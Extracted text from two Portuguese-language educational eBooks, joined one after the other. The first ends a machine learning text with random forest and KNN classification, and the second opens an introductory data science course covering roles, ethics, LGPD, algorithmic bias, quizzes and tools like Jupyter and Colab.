scaler.fit_transform(X_train.drop(categoricas, axis=1)) 
X_train_transformed = 
pd.DataFrame(data=data_transformed_train, 
columns=X_train.drop(categoricas, axis=1).columns) 
X_train_transformed = pd.concat([X_train_transformed, 
X_train[categoricas]], axis=1) 
 
data_transformed_test = 
scaler.transform(X_test.drop(categoricas, axis=1)) 
X_test_transformed = 
pd.DataFrame(data=data_transformed_test, 
columns=X_test.drop(categoricas, axis=1).columns) 
X_test_transformed = pd.concat([X_test_transformed, 
X_test[categoricas]], axis=1) 
 
#Instanciar e treinar o modelo de árvore de decisão 
rf = RandomForestClassifier(random_state=0) 
rf.fit(X_train_transformed, y_train) 
 
#Predições do modelo utilizando os dados de teste 
y_pred = rf.predict(X_test_transformed) 
 
#Gerar métricas para avaliar a qualidade do modelo 
accuracy_test = np.round(accuracy_score(y_test, y_pred),4) 
 
print(f'Accuracy: {accuracy_test}\n') 
print(classification_report(y_test, y_pred)) 
 
 
 
 
 
 

 
 
 
#Gerar importância das variáveis 
df_importancia = 
pd.DataFrame({'Variáveis':list(rf.feature_names_in_), 
                               
'Importância':list(rf.feature_importances_)}) 
df_importancia = 
df_importancia.sort_values(by='Importância', 
ascending=False, ignore_index=True).copy() 
 
#Gerar gráfico de importância 
plt.figure(figsize=(8,6)) 
sns.barplot(data=df_importancia, x='Importância', 
y='Variáveis') 
plt.xlabel('Importância', fontsize=12, fontweight='bold') 
plt.ylabel('Variáveis', fontsize=12, fontweight='bold') 
plt.title('Importância das variáveis no algoritmo floresta 
aleatória', fontsize=12, fontweight='bold') 
plt.savefig('./rf_feature_importance_phone_classification_f
ull_classes.png', bbox_inches='tight') 
 
O modelo de floresta aleatória obteve uma acurácia levemente superior 
ao modelo de árvore, sendo de 88,83% aqui contra aproximadamente 84% 
anterior. O resultado aqui leva em consideração as quatro classes (0, 1, 2, 3). A 
Figura 5.1 abaixo apresenta os resultados das métricas. 
 
 
Figura 5.1: Relatório de classificação para a floresta aleatória 

 
 
Esse relatório apresenta valores levemente superiores aos da árvore de 
classificação, ou seja, um pouco mais próximos de 1. Em uma comparação direta 
somente levando em consideração as métricas apresentadas o algoritmo 
baseado em floresta aleatória leva vantagem, mesmo que pequena e se mostra 
um pouco melhor na tarefa de classificação das faixas de preço dos celulares. 
Essa superioridade faz sentido uma vez que a floresta conta com diversas 
árvores e seu algoritmo possui técnicas não exploradas nesse texto que ajudam 
a torná-lo mais robusto. Um ponto negativo é que modelos mais complexos, 
mesmo tendendo a gerar melhores predições são mais difíceis de serem 
explicados e avaliados. Em muitos casos, vale mais a pena utilizar um modelo 
mais simples que seja facilmente explicável (porque está classificando dessa 
forma e a importância de suas variáveis) do que algo complexo. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
5.2. MODELO DE CLASSIFICAÇÃO BASEADO NO ALGORITMO DOS K 
VIZINHOS MAIS PRÓXIMOS 
 
O algoritmo KNN aplicado à um problema de classificação segue um 
racional muito parecido com o já apresentado na parte de regressão. Como já 
explicado anteriormente, o KNN memoriza os exemplos de treinamento e ao 
realizar o teste em novos dados calcula a distância entre esses pontos. Com 
base na quantidade de vizinhos escolhidos na configuração do algoritmo a classe 
pertencente de cada nova amostra é escolhida. Essa escolha é feita com base 
na classe já conhecida dos dados memorizados (treinamento), de maneira que 
o sistema seja uma votação na qual o resultado é baseado na maioria. Para ficar 
mais claro, veja a Figura 5.2 abaixo. 
 
 
Figura 5.2: Dispersão de pontos em um plano 2D e as regiões de decisão do algoritmo 
KNN 

 
 
Nesse exemplo simples estamos interessados em classificar um novo 
elemento que está representado pelo símbolo +. O plano apresenta pontos 
dispersos provenientes das variáveis 1 e 2. Os pontos com marcadores de 
triângulo vermelho e com marcadores de círculos azuis são os dados 
memorizados (treinamento) pelo algoritmo. O novo elemento é inserido no 
algoritmo e sua distância é calculada em relação a todos os pontos. Nesse 
momento, o valor de k (quantidade de vizinhos) já deve ter sido escolhido. Para 
k = 3 veja que o círculo tracejado menor possui três pontos além do novo 
elemento, sendo dois vermelhos e um azul e, portanto, o novo elemento é 
classificado com pertencente à Classe 1 (triângulos vermelhos). Para k = 5 veja 
que o círculo tracejado maior possui cinco pontos além do novo elemento, sendo 
três azuis e dois vermelhos e, portanto, o novo elemento é classificado com 
pertencente à Classe 2 (círculos azuis). Após analisar esse exemplo, fica claro 
que a escolha do valor k altera o resultado do algoritmo. Além disso, recomenda-
se que o valor de k seja um número ímpar (3, 5, 7, ...) para evitar o empate entre 
classes distintas. 
 
O KNN para problemas de classificação difere do modelo de regressão 
apenas pela questão da votação da maioria de amostras na vizinhança, visto 
que na regressão é feita uma média dos valores dos vizinhos mais próximos. É 
um método relativamente simples, mas que produz ótimos resultados. A 
biblioteca scikit-learn possui a implementação do KNN para classificação, sendo 
necessário instanciar o objeto KNeighborsClassifier(). A implementação é muito 
semelhante à dos demais classificadores apresentados anteriormente. 
 
 
 
 

 
 
FINALIZAR 
 
Após a leitura desse material, espero que o aprendizado dos conceitos 
relacionados à machine learning esteja mais fácil. Como dito anteriormente, essa 
foi uma introdução ao assunto e abrirá caminho para diversos outros conceitos. 
As técnicas utilizadas nesse material são básicas e de caráter educativo, 
visto que o leitor precisa se familiarizar com os conteúdos e amadurecer aos 
poucos para conseguir compreender tópicos mais complexos. Os modelos de 
machine learning apresentados aqui foram todos utilizados com suas 
configurações padrão. O leitor pode buscar se aprofundar em técnicas que 
buscam os melhores parâmetros dentro de um conjunto definido para cada 
modelo. 
Além disso, várias questões relacionadas ao aprendizado dos modelos e 
reamostragem dos dados não foram abordadas também, visto que são um pouco 
mais complexas para esse início de jornada. 
Espero que esse material tenha despertado a curiosidade no leitor para 
continuar investigando esse mundo maravilhoso dos algoritmos de machine 
learning. Parabenizo o esforço empregado até aqui e convido o leitor a mergulhar 
de cabeça nos estudos pois vale a pena. 
Prof. Dr. Thiago Santana Lemes 
 
 
 
 
 
 
 
 
 

 
 
Sobre o autor 
 
Thiago Santana Lemes é doutor em Engenharia Elétrica e de Computação pela 
Universidade Federal de Goiás (UFG), Cientista de dados na Ernst Young (EY). 
Experiência docente no ensino básico atuando na disciplina de matemática e nos 
cursos de Engenharia e Sistemas de Informação atuando nas disciplinas de 
cálculo diferencial, álgebra linear, cálculo numérico, equações diferenciais, 
probabilidade e estatística, algoritmos dentre outras. Desenvolve pesquisas na 
área de inteligência artificial com modelos de Machine Learning (implementação 
de modelos de regressão, classificação e recomendação), Deep Learning (redes 
convolucionais, redes recorrentes) e modelos de otimização (algoritmos 
genéticos e modelos lineares). 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
Referências Bibliográficas 
 
Faceli, K., Lorena, A. C., Gama, J., Almeida, T. A. de, & Carvalho, A. C. P. L. F. 
de. (2023). Inteligência Artificial Uma Abordagem de Aprendizado de 
Máquina (2nd ed.). LTC. 
Harris, C. R., Millman, K. J., van der Walt, S. J., Gommers, R., Virtanen, P., 
Cournapeau, D., Wieser, E., Taylor, J., Berg, S., Smith, N. J., Kern, R., Picus, 
M., Hoyer, S., van Kerkwijk, M. H., Brett, M., Haldane, A., del Río, J. F., 
Wiebe, M., Peterson, P., … Oliphant, T. E. (2020). Array programming with 
NumPy. Nature, 585(7825), 357–362. https://doi.org/10.1038/s41586-020-
2649-2 
Hunter, J. D. (2007). Matplotlib: A 2D Graphics Environment. Computing in 
Science & Engineering, 9(3), 90–95. https://doi.org/10.1109/MCSE.2007.55 
Lundberg, S. M., & Lee, S.-I. (2017). A Unified Approach to Interpreting Model 
Predictions. Advances in Neural Information Processing Systems 30, 4765–
4774. 
Morettin, P. A., & Singer, J. da M. (2023). Estatística e Ciência de Dados (1st 
ed.). LTC. 
Pedregosa, F. and V., G. and Gramfort, A. and Michel, V. and Thirion, B. and 
Grisel, O. and Blondel, M. and Prettenhofer, P. and Weiss, R. and Dubourg, 
V. and Vanderplas, J. and Passos, A. and Cournapeau, D. and Brucher, M. 
and Perrot, & M. and Duchesnay. (2011). Scikit-learn: Machine Learning in 
Python. Journal of Machine Learning Research, 12, 2825–2830. 
The pandas development team. (2024). Pandas. Https://Pandas.Pydata.Org. 
Waskom, M. (2021). seaborn: statistical data visualization. Journal of Open 
Source Software, 6(60), 3021. https://doi.org/10.21105/joss.03021 
  


--- Fim do arquivo: eBook - Machine Learning.pdf ---

--- Começo do arquivo: eBook - Fundamentos de Data Science.pdf ---

 
 
OBJETIVOS 
 
OBJETIVO GERAL 
Ao final da disciplina os alunos compreenderão os fundamentos, técnicas e aplicações da Ciência 
de Dados, incluindo a importância dos processos de coleta, processamento, análise e 
interpretação de dados. Eles conhecerão as principais tecnologias, ferramentas e linguagens 
empregadas na área, bem como a compreenderão o papel ético e responsável na manipulação 
de dados.  
OBJETIVOS ESPECÍFICOS 
 Entender as diferenças entre as diversas profissões relacionadas a 
ciência de dados 
 Conhecer as principais ferramentas utilizadas na análise de dados 
 Compreender as etapas de exploração de dados, transformação de dados 
e criação de modelos de dados 
 Familiarizar as tendências da inteligência artificial 
Conheça como esse conteúdo foi organizado! 
Unidade 1: Fundamentos da Ciência de Dados  
Unidade 2: Tecnologias e Ferramentas em Ciência de Dados  
Unidade 3: Exploração e Análise de Dados 
Unidade 4: Modelagem e Aprendizado de Máquina 
Unidade 5: Tópicos Avançados e Tendências em Ciência de Dados  
 
 
 

 
 
UNIDADE 1 FUNDAMENTOS DA CIÊNCIA DE DADOS 
 
OBJETIVOS DA UNIDADE 1  
Ao final dos estudos, você deverá ser capaz de: Entender a importância da 
Ciência de Dados na era da informação e sua aplicabilidade em diversos 
contextos. Diferenciar os conceitos de Ciência de Dados, Análise de Dados e 
Engenharia de Dados. E refletir sobre as questões éticas e a responsabilidade 
associadas à manipulação de dados, desenvolvendo uma consciência crítica 
sobre seu uso. 
 
 

 
 
1.1 A importância da Ciência de Dados na era da informação 
 
Com a explosão de dados na era digital advindo de 
fontes diversas, como transações comercias, redes 
sociais, dispositivos IoT, etc. surgiu uma nova área 
chamada Ciência de Dados.  
A Ciência de Dados é um campo que combina 
habilidades 
de 
programação, 
estatística, 
e 
conhecimento de domínio para analisar conjuntos 
de dados complexos e tomar decisões.  
Em um mundo onde os dados são abundantes, 
extrair significado e insights valiosos tornou-se crucial para empresas e 
organizações em todos os setores.  
Por exemplo, empresas de comércio eletrônico usam análises de dados para 
entender o comportamento do cliente e otimizar suas estratégias de marketing, 
enquanto instituições financeiras empregam modelos de previsão para mitigar 
riscos e maximizar retornos. 
Aprenda Mais: O trabalho será transformado pela ciência de dados. 
Disponível em: https://www.youtube.com/watch?v=E9vqtzILM9U 
 
1.2 Ciência de Dados x Análise de Dados x Engenharia de Dados 
 
Embora frequentemente interligadas, Ciência de Dados, Análise de Dados e 
Engenharia de Dados têm papéis distintos no ciclo de vida dos dados.  
A Ciência de Dados concentra-se na descoberta de padrões, insights e na 
construção de modelos preditivos ou prescritivos a partir dos dados. Um 
cientista de dados geralmente lida com problemas mais complexos e 
exploratórios, usando uma combinação de habilidades em programação e 
Videoaula do tópico disponível no AVA: 
Videoaula 1: A importância da Ciência de Informação na era da informação. 
Videoaula do tópico disponível no AVA: 
Videoaula 2: Ciência de Dados x Análise de Dados x Engenharia de Dados. 
IoT, ou Internet das Coisas 
(em 
inglês, 
Internet 
of 
Things), 
refere-se 
a 
um 
conceito onde objetos físicos 
cotidianos estão conectados 
à internet e podem coletar e 
trocar dados entre si e com 
outros sistemas. Dispositivos 
IoT são os componentes 
físicos 
dessa 
rede 
interconectada. 

 
 
estatística. Eles estão envolvidos em todas as etapas do ciclo de vida dos dados, 
desde a coleta e limpeza até a análise e interpretação, muitas vezes utilizando 
técnicas avançadas de machine learning e inteligência artificial para resolver 
problemas. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
A Análise de Dados, por outro lado, se concentra na interpretação e 
comunicação desses insights para apoiar a tomada de decisões.   Um analista 
de dados tende a se concentrar em tarefas mais específicas e operacionais, 
como a geração de relatórios regulares, análises descritivas ou diagnósticas 
e investigações ad hoc dos dados. Eles são habilidosos em manipulação e 
visualização de dados, utilizando ferramentas como SQL, Excel, Tableau e 
Power BI para apresentar informações de forma clara e acessível. Os analistas 
de dados geralmente trabalham mais próximos das necessidades imediatas do 
negócio, respondendo a perguntas específicas e fornecendo suporte analítico 
para tomada de decisões. 
Já a Engenharia de Dados lida com a infraestrutura e processos necessários 
para coletar, armazenar e gerenciar grandes volumes de dados. Por exemplo, 
enquanto um cientista de dados desenvolve um modelo de aprendizado de 
A análise descritiva envolve a descrição e resumo de dados de forma clara e concisa, geralmente por 
meio de estatísticas básicas e técnicas de visualização de dados. Seu principal objetivo é descrever 
o que aconteceu (passado) nos dados, sem tentar extrair conclusões além dessa descrição.  Exemplo: 
identificar quais produtos mais vendem. 
A análise diagnóstica refere-se ao processo de investigar e compreender os dados na busca 
identificar e compreender as causas ou origens de um determinado problema, fenômeno ou situação. 
É uma etapa fundamental que visa identificar padrões, tendências, anomalias e características dos 
dados que podem fornecer insights sobre o problema em questão. Exemplo: investigar causas de 
flutuações de vendas. 
A análise prescritiva vai além da descrição do passado e da previsão do futuro, ela busca prescrever 
recomendações ou ações específicas para otimizar os resultados. Em vez de apenas prever o que 
acontecerá, a análise prescritiva procura responder à pergunta "o que devemos fazer sobre isso?". 
Isso geralmente envolve a utilização de técnicas avançadas de otimização e simulação para 
identificar a melhor estratégia a ser adotada em uma determinada situação. Exemplo: recomendar 
estratégia de preços. 
A análise preditiva envolve a aplicação de técnicas estatísticas e algoritmos de aprendizado de 
máquina para fazer previsões sobre eventos futuros com base em dados históricos. Em vez de 
apenas descrever o que aconteceu no passado, a análise preditiva busca entender relações entre 
variáveis e utilizar essas relações para prever resultados futuros. Exemplo: antecipar quantidade 
futura de vendas de determinado produto. 

 
 
máquina para prever vendas futuras, um engenheiro de dados pode garantir que 
os dados necessários estejam disponíveis e acessíveis em um ambiente de 
armazenamento adequado. 
Observação: Tanto cientistas de dados quanto analistas de dados podem 
realizar diferentes tipos de análise (descritiva, diagnóstica, preditiva ou 
prescritiva), dependendo de suas habilidades, experiência e do contexto do 
projeto em que estão trabalhando. 
Aprenda Mais: Data Analytics vs Data Science. Disponível em: 
https://www.youtube.com/watch?v=dcXqhMqhZUo 
(use 
as 
legendas 
em 
Português) 
 
1.3 Relação entre inteligência artificial e ciência de dados 
A Inteligência Artificial, um campo amplo que refere-se à capacidade das 
máquinas de realizar tarefas que normalmente requerem inteligência humana. 
Envolve o desenvolvimento de algoritmos e sistemas que podem simular 
processos cognitivos, como aprendizado, raciocínio, resolução de problemas e 
percepção. 
O Aprendizado de Máquina é um subcampo da Inteligência Artificial que se 
concentra no desenvolvimento de algoritmos que permitem aos computadores 
aprenderem a partir de dados. 
Os algoritmos de aprendizado de máquina permitem que os sistemas melhorem 
automaticamente sua performance em uma determinada tarefa à medida que 
são expostos a mais dados. 
Dentro do Aprendizado de Máquina, as Redes Neurais surgem como modelos 
computacional inspirados no funcionamento do cérebro humano, composto por 
neurônios artificiais interconectados. É uma poderosa ferramenta que permite 
sistemas a aprenderem padrões complexos e realizar tarefas sofisticadas. O 
Aprendizado Profundo, uma vertente do Aprendizado de Máquina, leva essa 
ideia adiante, utilizando redes neurais profundas para analisar e compreender 
dados não estruturados, como imagens e áudio. 
Em paralelo, a Ciência de Dados se utiliza dessas técnicas e outras 
metodologias para extrair insights valiosos de grandes volumes de dos dados. 
Por meio da análise estatística e da aplicação de algoritmos de Aprendizado de 
Máquina e Aprendizado Profundo, os cientistas de dados podem desvendar 

 
 
padrões complexos, gerando conhecimentos acionáveis para uma variedade de 
aplicações.  
 
Fonte: https://www.serpro.gov.br/menu/noticias/noticias-2019/democratizando-
a-inteligencia-artificial 
 
1.4 Aplicações da Ciência de Dados em diversos setores 
 
A aplicação da Ciência de Dados é vasta e abrange uma ampla gama de setores. 
Na saúde, por exemplo, análises de dados podem ser usadas para identificar 
padrões em grandes conjuntos de dados de pacientes e melhorar o diagnóstico 
e tratamento de doenças.  
No setor de varejo, a análise de dados de transações pode ser usada para 
personalizar recomendações de produtos, segmentar clientes, detectar 
tendências, personalizar produtos e otimizar a cadeia de suprimentos, resultando 
em economia de recursos e maior reconhecimento da marca.  
No setor financeiro, a ciência de dados permite prever comportamentos de risco, 
reduzindo taxas de inadimplência e automatizando o gerenciamento de crédito, 
o que é crucial para políticas de concessão de crédito mais seguras.  
Videoaula do tópico disponível no AVA: 
Videoaula 3: Aplicações da Ciência de Dados em diversos setores. 

 
 
Na manufatura, a análise de dados orientada por insights tem melhorado a 
eficiência, reduzindo custos e tempo de produção, além de otimizar processos 
de inventário e logística. 
A logística também se beneficia da Ciência de Dados, com empresas utilizando 
algoritmos para traçar rotas mais precisas e eficientes, resultando em redução 
de custos e aumento da qualidade do serviço.  
Até mesmo em áreas como esportes e entretenimento, a Ciência de Dados 
desempenha um papel significativo na análise de desempenho de atletas e na 
recomendação de conteúdo personalizado para os usuários.  
Esses exemplos destacam como a Ciência de Dados está moldando e 
impulsionando a inovação em diversos setores, transformando a maneira como 
as organizações operam e interagem com seus clientes.  
Segundo o McKinsey Global Institute, no artigo “Connected world: An evolution 
in connectivity beyond the 5G Revolution”, o mundo dever consumir até 20 vezes 
mais dados em 2030 do que consumia em 2020, isso demonstra que a demanda 
por profissionais da área de dados só tende a crescer. 
 
Hoje, parte das empresas já se preocupa em estabelecer um Centro de 
Excelência focado em dados e análises. A cultura Data Driven é crucial para 
transformar dados em conhecimento utilizável e para capacitar colaboradores a 
tomar decisões informadas. 
 
1.5 Ética e responsabilidade na manipulação de dados 
A manipulação de dados na era da Ciência de Dados levanta questões éticas e 
responsabilidades significativas. À medida que mais dados são coletados e 
analisados, surgem preocupações sobre privacidade, discriminação e viés 
algorítmico.  
A garantia da segurança na coleta de informações é primordial, assim como a 
obtenção do consentimento dos indivíduos e a transparência no uso dos dados. 
A chegada da Lei Geral de Proteção de Dados (LGPD) estabeleceu parâmetros 
para o uso dos dados, exigindo respeito à privacidade e autonomia dos clientes, 
McKinsey Global Institute, Connected world: An evolution in connectivity beyond the 5G Revolution, 2020. 
Disponível 
em: 
https://www.mckinsey.com/industries/technology-media-and-telecommunications/our-
insights/connected-world-an-evolution-in-connectivity-beyond-the-5g-revolution 

 
 
enquanto ainda permite o acesso aos dados para estratégias organizacionais, 
exigindo medidas de segurança contra invasões e vazamentos. 
A ética de dados envolve o estudo e a aplicação de princípios para coletar, usar 
e proteger os dados de forma responsável. Isso é crucial porque os dados podem 
ser utilizados para diversos fins, desde ajudar na tomada de decisões até serem 
explorados por criminosos. Portanto, é necessário considerar questões como o 
uso de tecnologias como o Big Data, garantindo que informações sensíveis não 
sejam expostas. 
A importância da ética de dados está em garantir que as pessoas mantenham o 
controle sobre suas informações pessoais, reduzindo os riscos cibernéticos e 
protegendo a privacidade. Além disso, permite aos cidadãos o acesso e a 
correção de suas informações, enquanto possibilita às empresas a inovação de 
produtos e serviços que atendam aos interesses dos clientes, evitando 
responsabilidades legais. 
Na 
atualidade, 
aspectos 
como 
consentimento 
informado, 
anonimato, 
confidencialidade, segurança, privacidade, exatidão, propriedade, honestidade e 
responsabilidade são fundamentais na ética de dados. É necessário garantir que 
os consumidores tenham transparência sobre como seus dados são 
compartilhados e acessados, além de investir em tecnologias e políticas de 
segurança para proteger as informações. 
A regulação da Inteligência Artificial (IA) no Brasil está ganhando forma através 
de iniciativas legais e regulamentares que visam garantir a conformidade ética e 
legal no desenvolvimento e uso dessas tecnologias. Um exemplo é o Projeto de 
Lei (PL 2338/23), que estabelece diretrizes para a regulamentação da IA no país, 
buscando equilibrar inovação e segurança. Essa lei propõe mecanismos para 
assegurar que as soluções de IA sejam desenvolvidas e utilizadas de maneira 
responsável, considerando aspectos como transparência, segurança e direitos 
fundamentais. 
Além disso, a Lei Geral de Proteção de Dados (LGPD) impõe exigências 
rigorosas sobre o tratamento de dados pessoais, que são muitas vezes o 
combustível para algoritmos de IA. A conformidade com a LGPD é a 
asseguração de que as práticas de IA respeitam a privacidade e os direitos dos 
indivíduos, prevenindo abusos e garantindo a proteção dos dados. 
A implementação da ética de dados requer um compromisso compartilhado entre 
profissionais, organizações e sociedade. Além disso, é essencial compreender 
as leis e regulamentações, como a LGPD, e adotar práticas que promovam a 
segurança e a privacidade dos dados. Por fim, a ética de dados deve ser parte 

 
 
integrante das políticas e procedimentos das empresas, com treinamento 
adequado e constante avaliação e atualização das medidas de segurança. 
Aprenda Mais: De DPO para DPO: como tratar dados de forma ética 
em 
data 
Science. 
Disponível 
em:  
https://www.serpro.gov.br/lgpd/noticias/2019/tratamento-etico-dados-pessoais-
ciencia-data-science 
 
Exercício proposto: Para ampliar seu aprendizado e auxiliar a 
fixação dos conceitos, monte um mapa mental das palavras chaves do artigo de 
DPO para DPO: como tratar dados de forma ética em Data Science. Você pode 
utilizar um programa para construção de mapas mentais, por exemplo o 
https://miro.com/, ou fazer em uma folha de papel. 
 
Tem dúvidas de como estudar com mapas mentais? Assista o vídeo Como fazer 
um 
MAPA 
MENTAL 
de 
forma 
simples 
e 
rápida: 
https://www.youtube.com/watch?v=rl23Ao4ccIE 
 
1.5.1. Viés algorítmico 
Um outro ponto de destaque do uso de dados na ciência de dados é o viés 
algorítmico, que se refere à tendência dos algoritmos de tomarem decisões 
enviesadas ou discriminatórias com base nos dados com os quais foram 
treinados. Por exemplo, algoritmos de recrutamento baseados em dados podem 
inadvertidamente perpetuar preconceitos existentes se os conjuntos de dados 
utilizados refletirem desigualdades históricas. Isso ocorre porque os algoritmos 
aprendem com os dados disponíveis, e se esses dados contiverem preconceitos, 
o algoritmo pode reproduzi-los em suas decisões. 
Portanto, os profissionais de Ciência de Dados devem estar cientes desse viés 
e tomar medidas para mitigá-lo. Isso inclui não apenas garantir a precisão e 
eficácia dos modelos, mas também considerar os impactos sociais e éticos de 
suas decisões. Adotar práticas transparentes, garantir a proteção da privacidade 
dos dados e promover a equidade são elementos essenciais para o uso 
responsável da Ciência de Dados. 
Ao lidar com o viés algorítmico, os profissionais de Ciência de Dados devem 
examinar criticamente os conjuntos de dados utilizados em seus modelos, 

 
 
identificar e corrigir quaisquer tendências discriminatórias e buscar maneiras de 
aumentar a diversidade e representatividade dos dados. Além disso, é 
importante implementar medidas de transparência, permitindo que os usuários 
entendam como as decisões são tomadas e tenham a oportunidade de contestá-
las ou solicitar revisões. 
A equidade deve ser uma consideração central em todas as etapas do processo 
de ciência de dados, desde a coleta e preparação dos dados até o 
desenvolvimento e implementação dos modelos. Isso envolve não apenas a 
eliminação de preconceitos existentes, mas também a criação de sistemas que 
promovam a igualdade de oportunidades e tratamento justo para todos os 
envolvidos. 
 
Aprenda Mais: 
Discriminação 
algorítmica. 
Disponível 
em: 
https://pt.wikipedia.org/wiki/Discrimina%C3%A7%C3%A3o_algor%C3%ADtmic
a 
Exercício proposto: 
1) Qual é o principal objetivo da Ciência de Dados na era da informação? 
a) Desenvolver aplicativos móveis 
b) Analisar conjuntos de dados complexos e extrair insights valiosos 
c) Criar redes sociais 
d) Implementar sistemas de segurança cibernética 
 
2) Qual é a principal responsabilidade da Engenharia de Dados no ciclo de vida 
dos dados? 
a) Construir modelos preditivos 
b) Interpretar insights e comunicar resultados 
c) Desenvolver aplicativos de visualização de dados 
d) Coletar, armazenar e gerenciar grandes volumes de dados 
 
3) O que significa viés algorítmico na Ciência de Dados? 

 
 
a) Tendência dos algoritmos de tomarem decisões baseadas em dados 
históricos 
b) Capacidade dos algoritmos de aprender com grandes conjuntos de dados 
c) Inclusão de preconceitos nos algoritmos devido aos dados utilizados 
d) Adoção de práticas transparentes na análise de dados 
 
4) Uma empresa de tecnologia está planejando uma nova estratégia para lidar 
com seus dados e melhorar suas operações. Para isso, está considerando a 
contratação de profissionais especializados em Ciência de Dados, Análise de 
Dados e Engenharia de Dados. Abaixo estão breves descrições sobre cada uma 
dessas áreas: 
I) Ciência de Dados: Esta área se concentra na descoberta de padrões, insights 
e na construção de modelos preditivos ou prescritivos a partir dos dados. Os 
profissionais de Ciência de Dados geralmente lidam com problemas mais 
complexos e exploratórios, utilizando uma combinação de habilidades em 
programação e estatística. 
II) Análise de Dados: Por outro lado, a Análise de Dados foca na interpretação e 
comunicação desses insights para apoiar a tomada de decisões. Os analistas de 
dados tendem a se concentrar em tarefas mais específicas e operacionais, como 
a geração de relatórios regulares e análises descritivas dos dados. 
III) Engenharia de Dados: Já a Engenharia de Dados lida com a infraestrutura e 
processos necessários para coletar, armazenar e gerenciar grandes volumes de 
dados. Os engenheiros de dados garantem que os dados estejam disponíveis e 
acessíveis em um ambiente de armazenamento adequado, além de cuidar da 
integridade e segurança desses dados. 
Considerando as descrições fornecidas sobre Ciência de Dados, Análise de 
Dados e Engenharia de Dados, qual dessas áreas seria mais adequada para 
lidar com a análise de padrões de comportamento dos clientes e a construção 
de modelos de previsão de vendas para a empresa de tecnologia? 
a) Ciência de Dado 
b) Análise de Dados 
c) Engenharia de Dados 
d) Todas as áreas mencionadas 
 
Resposta correta 1: b) Analisar conjuntos de dados complexos e extrair insights 
valiosos 

 
 
Resposta correta 2: d) Coletar, armazenar e gerenciar grandes volumes de 
dados 
Resposta correta 3: c) Inclusão de preconceitos nos algoritmos devido aos dados 
utilizados 
Resposta correta 4: a) Ciência de Dados 
 
 

 
 
UNIDADE 2 TECNOLOGIAS E FERRAMENTAS EM CIÊNCIA DE 
DADOS 
 
OBJETIVOS DA UNIDADE 2 
Ao final dos estudos, você deverá ser capaz de: Identificar principais 
tecnologias e linguagens empregadas em Ciência de Dados, como Python, 
Linguagem R, Tableau, PowerBI, e outros frameworks, compreendendo suas 
capacidades e aplicações práticas na interpretação de conjuntos de dados 
complexos. 
 
 

 
 
2.1 Plataformas e ambientes de desenvolvimento em Ciência de Dados 
 
2.1.1 Jupyter Notebooks e Google Colab 
Jupyter Notebooks e Google Colab são ambientes de desenvolvimento 
interativos que permitem escrever e executar código em blocos, facilitando a 
exploração de dados e a criação de modelos.  
O Jupyter Notebook é uma ferramenta de computação interativa que tem 
ganhado popularidade na comunidade de ciência de dados e programação em 
geral. Ele oferece um ambiente flexível onde os usuários podem escrever e 
executar código em várias linguagens de programação, incluindo Python, R, 
Julia e muitas outras. Uma das características distintivas do Jupyter Notebook é 
sua capacidade de integrar código, texto formatado e visualizações em um único 
documento, facilitando a criação de relatórios, demonstrações e análises 
interativas. 
 
No Jupyter Notebook, o código é organizado em células que podem ser 
executadas individualmente. Isso permite uma abordagem iterativa no 
desenvolvimento de código, onde os usuários podem testar pequenos trechos 
de código e ver imediatamente os resultados. Além disso, as células de texto 
formatado, escritas em Markdown, permitem a inclusão de explicações, 
Videoaula do tópico disponível no AVA: 
Videoaula 5: Plataformas e ambientes de desenvolvimento em Ciência de Dados. 

 
 
equações, imagens e links, tornando o notebook uma ferramenta ideal para 
documentar o processo de análise de dados e compartilhar resultados. 
Para usar o Jupyter Notebook pode ser instalado o Anaconda Navigator que é 
uma distribuição popular de Python e R, utilizada especialmente em ambientes 
de ciência de dados, que inclui um conjunto de pacotes pré-instalados, incluindo 
o Python, bibliotecas científicas como NumPy, pandas, Matplotlib, scikit-learn, 
entre outras, além de ambientes de desenvolvimento como o Jupyter Notebook 
e o JupyterLab. 
 
O Google Colab, abreviação de Google Colaboratory, é uma plataforma gratuita 
baseada na nuvem oferecida pelo Google que permite aos usuários escrever e 
executar código Python em notebooks interativos. Essa ferramenta foi 
desenvolvida para facilitar o desenvolvimento e a colaboração em projetos de 
ciência de dados, machine learning, pesquisa e educação. Uma das principais 
vantagens do Google Colab é que ele elimina a necessidade de configurar um 
ambiente de desenvolvimento local, pois todo o processamento é feito nos 
servidores do Google. 
Os notebooks do Google Colab fornecem um ambiente semelhante ao Jupyter 
Notebook, onde os usuários podem criar e executar células de código, além de 
adicionar texto formatado, gráficos e visualizações. Além disso, o Colab oferece 
integração com várias bibliotecas populares de ciência de dados e machine 
learning, como TensorFlow, PyTorch, scikit-learn e muitas outras. Isso permite 
que os usuários aproveitem as poderosas capacidades dessas bibliotecas sem 
a necessidade de configurar seus próprios ambientes de desenvolvimento. 
Uma das características mais atraentes do Google Colab é sua capacidade de 
utilizar GPUs (Graphics Processing Units) e TPUs (Tensor Processing Units) 
gratuitamente. Isso é especialmente útil para tarefas que exigem grande poder 
computacional, como treinamento de modelos de deep learning em conjuntos de 
dados volumosos. Além disso, o Colab oferece integração com serviços do 

 
 
Google, como Google Drive, facilitando o compartilhamento de notebooks e 
dados entre colaboradores. 
 
Aprenda Mais:  
Jupyter 
Notebook 
ou 
Colab 
| 
Qual 
o 
melhor? 
Disponível 
em: 
https://www.youtube.com/watch?v=AhucYVEMAzw 
 
2.2 Principais tecnologias e linguagens utilizadas em Ciência de Dados 
 
A Ciência de Dados é um campo interdisciplinar utiliza uma variedade de 
tecnologias e linguagens para coletar, processar, analisar e interpretar dados. 
Desde linguagens de programação até ferramentas especializadas em 
visualização e machine learning, o arsenal de tecnologias disponíveis para os 
cientistas de dados é vasto e em constante evolução. Podemos destacar 
algumas: 
 No âmbito das linguagens de programação, Python e R são as principais 
escolhas, destacando-se por sua versatilidade, vasta comunidade de 
desenvolvedores e extensivas bibliotecas especializadas em análise de 
dados.   
 O aprendizado de máquina (machine learning) é uma faceta essencial da 
Ciência de Dados, e ferramentas como TensorFlow, scikit-learn e PyTorch 
oferecem uma gama de algoritmos e técnicas para modelagem preditiva, 
classificação, regressão e agrupamento de dados.  
 Na área de visualização de dados, ferramentas como Matplotlib, Seaborn, 
Power BI e Tableau são utilizadas para criar visualizações claras e 
informativas 
 
2.2.1 Python 
Python é uma das linguagens mais populares na ciência de dados devido à sua 
simplicidade, 
versatilidade 
e 
uma 
grande 
quantidade 
de 
bibliotecas 
